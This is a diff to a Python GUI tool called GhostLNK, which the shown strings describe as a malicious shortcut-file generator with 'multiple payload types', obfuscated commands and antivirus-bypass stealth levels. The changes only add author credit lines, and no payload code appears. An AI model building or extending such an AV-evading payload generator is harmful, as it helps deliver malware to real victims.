@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 """
 GhostLNK - Professional LNK Generator with Stealth Mode
+Created by: github.com/Excalibra
 Coded for educational and authorized testing purposes only
+Version: 6.0 - Stealth Mode Edition
 """
 
 import os
@@ -514,7 +516,7 @@ class GhostLNKGUI(QMainWindow):
     
     def init_ui(self):
         """Initialize the user interface"""
-        self.setWindowTitle("👻 GhostLNK v6.0 - Stealth Mode (AV Bypass)")
+        self.setWindowTitle("👻 GhostLNK v6.0 - Stealth Mode (AV Bypass) - Created by github.com/Excalibra")
         
         # Get screen geometry
         screen = QApplication.primaryScreen().availableGeometry()
@@ -568,11 +570,17 @@ class GhostLNKGUI(QMainWindow):
         main_layout.setSpacing(5)
         main_layout.setContentsMargins(8, 8, 8, 8)
         
-        # Title
+        # Title with credit
         title = QLabel("👻 GhostLNK - Stealth Mode (AV Bypass Edition) 👻")
         title.setAlignment(Qt.AlignmentFlag.AlignCenter)
         title.setStyleSheet("color: #a8a8ff; font-size: 18px; font-weight: bold; padding: 5px;")
         main_layout.addWidget(title)
+        
+        # Credit line
+        credit = QLabel("Created by: github.com/Excalibra")
+        credit.setAlignment(Qt.AlignmentFlag.AlignCenter)
+        credit.setStyleSheet("color: #88ff88; font-size: 12px; font-weight: bold; padding-bottom: 2px;")
+        main_layout.addWidget(credit)
         
         # Subtitle
         subtitle = QLabel("📌 Dropbox: &dl=1 | STEALTH: Avoids suspicious patterns that trigger AV")
@@ -618,12 +626,12 @@ class GhostLNKGUI(QMainWindow):
         console_group.setLayout(console_layout)
         main_layout.addWidget(console_group)
         
-        # Status bar
-        self.statusBar().showMessage("👻 Ready - Stealth options available to bypass AV detection")
+        # Status bar with credit
+        self.statusBar().showMessage("👻 Created by github.com/Excalibra - Stealth options available to bypass AV detection")
         self.statusBar().setStyleSheet("color: #a8a8ff;")
         
         self.create_menu()
-        self.log("👻 GhostLNK v6.0 initialized")
+        self.log("👻 GhostLNK v6.0 initialized - Created by github.com/Excalibra")
         self.log("[✓] Stealth Mode: Uses obfuscated commands to avoid AV detection")
         self.log("[✓] Multiple stealth levels available")
     
@@ -1163,6 +1171,7 @@ class GhostLNKGUI(QMainWindow):
     def show_about(self):
         QMessageBox.about(self, "About GhostLNK",
             "<b>GhostLNK v6.0 - Stealth Mode Edition</b><br><br>"
+            "<b>Created by: github.com/Excalibra</b><br><br>"
             "Ultimate LNK Generator with:<br>"
             "✓ Multiple payload types<br>"
             "✓ 3 stealth levels (Normal, Moderate, Maximum)<br>"
